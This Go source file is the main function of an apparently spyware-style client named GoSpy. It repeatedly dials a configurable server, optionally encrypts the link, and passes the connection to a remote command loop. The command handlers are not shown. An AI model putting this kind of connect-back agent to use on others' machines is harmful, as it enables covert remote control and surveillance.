package main

import (
	"flag"
	"github.com/psidex/GoSpy/internal/comms"
	"github.com/psidex/GoSpy/internal/gospy/commands"
	"log"
	"net"
)

func main() {
	address := flag.String("a", "127.0.0.1:12345", "the address (ip:port) of the gospyserver to connect to")
	password := flag.String("p", "", "the password to encrypt network data with")
	flag.Parse()
	serverAddress := *address
	serverPassword := *password

	for {
		log.Printf("Attempting connection to address: %s\n", serverAddress)
		conn, err := net.Dial("tcp", serverAddress)
		if err != nil {
			continue
		}

		var c comms.Connection

		if serverPassword != "" {
			log.Println("Password supplied, using encrypted connection")
			c = comms.NewEncryptedConnection(conn, serverPassword)
		} else {
			log.Println("No password supplied, using plaintext connection")
			c = comms.NewPlainConnection(conn)
		}

		log.Println("Successful connection")
		err = commands.CommandLoop(c, serverAddress, serverPassword)
		_ = c.Close()
		log.Printf("Connection dropped: %s\n", err.Error())
	}
}
